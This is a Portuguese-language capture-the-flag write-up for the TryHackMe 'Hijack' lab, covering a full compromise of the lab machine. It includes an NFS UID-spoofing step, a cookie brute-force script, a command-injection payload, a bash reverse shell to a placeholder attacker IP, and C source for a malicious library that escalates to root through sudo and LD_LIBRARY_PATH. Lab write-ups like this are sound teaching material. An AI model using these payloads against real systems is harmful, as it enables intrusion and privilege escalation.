<div align="center">

# 🚀 TryHackMe – Hijack (Writeup)

*"Se você pode sequestrar, você pode possuir."* 🕶️💻  

<p align="center">
  
</p>

</div>

---
<div align="center">

## 📌 Informações da Máquina

- **Categoria:** Linux | Web  
- **Dificuldade:** 🟢 Easy  
- **Tempo Estimado:** ⏱️ 120 min  
- **Status:** ✅ Rooted com sucesso  

</div>

---
<div align="center">
    
## 🗺️ Roadmap da Exploração

```mermaid
graph TD
A[Enumeração Inicial] --> B[NFS Enum]
B --> C[FTP Loot]
C --> D[Wordlist + Cookie Brute]
D --> E[Command Injection]
E --> F[Reverse Shell www-data]
F --> G[Credenciais Rick via config.php]
G --> H[SSH Rick]
H --> I[Sudo Abuse + LD_LIBRARY_PATH]
I --> J[Root Shell + Flags]
```

</div>



---

## 🔍 Enumeração Inicial

Primeiro, testei conectividade:

```bash
ping -c 3 $ALVO | grep -o "=64"
=64
=64
=64
````

Scan de portas e serviços:

```bash
nmap -A $ALVO
```

**Serviços identificados:**

* **21/tcp** → FTP (vsftpd 3.0.3)
* **22/tcp** → SSH (OpenSSH 7.2p2)
* **80/tcp** → HTTP (Apache 2.4.18)
* **111/tcp, 2049/tcp** → NFS / rpcbind

---

## 📂 Exploração do NFS

```bash
showmount -e $ALVO
```

Output:

```
/mnt/share *
```

Monte o share:
```bash
mount -t nfs $ALVO:/mnt/share share
```

UID/GID esperado: **1003**
```bash
useradd hijack
usermod -u 1003 hijack
groupmod -g 1003 hijack
su hijack
```

Dentro do share:
```bash
ls
for_employees.txt
cat for_employees.txt
```

📌 Credenciais encontradas:  
```
ftpuser:W3stV1rg1n14M0un741nM4m4
```

---

## 📡 FTP

Acesso ao FTP com sucesso:
```bash
ftp $ALVO
```

Arquivos encontrados:
* `-rw-r--r--  1 root root    368 Aug 19 01:30 .from_admin.txt` → admin informa que todos usam senhas de uma wordlist segura.
* `-rw-r--r--  1 root root   3150 Aug 19 01:30 .passwords_list.txtt` → lista com **senhas**.

```bash
$cat .from_admin.txt

To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.

$
$wc -l .passwords_list.txt && echo "" && head -n 10 .passwords_list.txt 
150 .passwords_list.txt

Vxb38mSNN8wxqHxv6uMX
56J4Zw6cvz8qDvhCWCVy
qLnqTXydnY3ktstntLGu
N63nPUxDG2ZvrhZgP978
jw3Ezr26tygTdgBZVYGr
zb9CFkd2QGDBjgyVvfDH
kfFpLAQFhD3S6TvYn4mv
nYyn4JxPhjSsm4HUeGtK
yGWCg6GNePUFZzV8f2gP
LFK43GAfc8JeVpCGCXzM
```

---

## 🍪 Brute-force de Sessão (Admin)

Cookie padrão em uso → formato:  
```
base64(usuario:md5(senha))
```

Decodificação do cookie com CyberChief:  
```
hijack:e10adc3949ba59abbe56e057f20f883e
```

Script para gerar wordlist:
```python
import hashlib
import base64

# Abrir o arquivo e ler as linhas
with open('.passwords_list.txt', 'r') as arquivo:
    linhas = arquivo.readlines()

# Fazer loop pelas linhas e modificar cada uma
for linha in linhas:
    # Remover espaçoes em branco inicio/ fim da linha
    senha = linha.strip()

    # Fazer hash de cada linha removida usando MD5
    hash_senha  = hashlib.md5(senha.encode('utf-8')).hexdigest()

    # Adicione "admin:" ao início do hash
    combinado = 'admin:' + hash_senha

    # Codifique o hash modificado para base64
    resultado = base64.b64encode(combinado.encode('utf-8'))

    # Imprimir o hash
    print(resultado.decode('utf-8'))
```

Execução:

```bash
python3 bruteforce.py > cookies.txt
```

Brute-force com wfuzz:
```bash
$wfuzz -u http://$ALVO/administration.php -w cookies.txt -X POST -b 'PHPSESSID=FUZZ' --hh 51

Total requests: 150

===================================================================
ID           Response   Lines    Word     Chars       Payload                
===================================================================

000000082:   200        42 L     66 W     864 Ch      "YWRtaW46ZDY1NzNlZDczOW
                                                      FlN2ZkZmIzY2VkMTk3ZDk0O
                                                      DIwYTU="
```

🎯 Cookie válido encontrado → acesso ao painel como **admin**.  

---

## 💣 Command Injection

No painel, havia o **Service Status Checker**.
Teste de injection:

```bash
&id
```

Output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reverse shell (como `nc` não estava instalado, usei bash):
```bash
$(bash -c 'bash -i >& /dev/tcp/ATAQUE_IP/1234 0>&1')
```

Listener:
```bash
$nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 10.201.6.151 36206
bash: cannot set terminal process group (1250): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Hijack:/var/www/html$ 

www-data@Hijack:/var/www/html$ cat config.php	
cat config.php
<?php
$servername = "localhost";
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
$dbname = "hijack";

// Create connection
$mysqli = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($mysqli->connect_error) {
  die("Connection failed: " . $mysqli->connect_error);
}
?>
```

---

## 🔑 Escalada para rick

Dentro do webroot:

```bash
cat config.php
```

Credenciais expostas:

```php
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
```

SSH com sucesso:
```bash
ssh rick@$ALVO
```

---

## 👤 Flag de Usuário

```bash
$ ls
user.txt
$ 
$ cat user.txt
THM{***********************}
```

---

## ⚡ Escalada de Privilégio

Verificando sudo:  
```bash
sudo -l
```

Permissão especial:  
```
rick pode rodar /usr/sbin/apache2 com LD_LIBRARY_PATH preservado
```

Apache depende de `libcrypt.so.1`.  

```bash
ldd /usr/sbin/apache2
```

Dependência: `libcrypt.so.1`.

Criei biblioteca maliciosa:

$ cd /tmp
$ 
$ pwd
/tmp
$ 
$ nano malware.c
$ cat malware.c
  
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


// Executa ao carregar a lib automático

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH"); // limpa variável
    setresuid(0,0,0);            // força UID/ GID = root
    system("/bin/bash -p");      // abre shell como priv root
}
```

Compilação:

```bash
gcc -shared -fPIC malware.c -o /tmp/libcrypt.so.1
```

Execução:

```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

Root shell obtida ✅

---

## 👑 Flag Root

```bash
$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
[sudo] password for rick: 
/usr/sbin/apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)
root@Hijack:/tmp# 
root@Hijack:/tmp# cd ..
root@Hijack:/# ls
bin   etc	  initrd.img.old  lost+found  opt   run   srv  usr	vmlinuz.old
boot  home	  lib		  media       proc  sbin  sys  var
dev   initrd.img  lib64		  mnt	      root  snap  tmp  vmlinuz
root@Hijack:/# 
root@Hijack:/# cd /root/
root@Hijack:/root# ls
root.txt
root@Hijack:/root# cat root.txt
THM{***********************}
```

---

## 🧩 Fluxo Final

1. NFS aberto → spoof de UID/GID.  
2. FTP com credenciais → wordlist segura do admin.  
3. Cookie `PHPSESSID` → brute-force com wordlist.  
4. Command Injection → shell como www-data.  
5. Credenciais no `config.php` → SSH rick.  
6. Sudo abuse (`LD_LIBRARY_PATH`) → root.  

---

## 🎉 Conclusão

Essa box foi um combo 🔥 de técnicas:  
- Exploração de **NFS mal configurado**  
- Senhas compartilhadas em FTP  
- **Cookies fracos** base64+MD5  
- Command Injection web clássico  
- Escalada de privilégios via **LD_LIBRARY_PATH** abuse  

💡 Ótima máquina para reforçar exploração de **Linux + Web**!  

---

<div align="center">


</div>


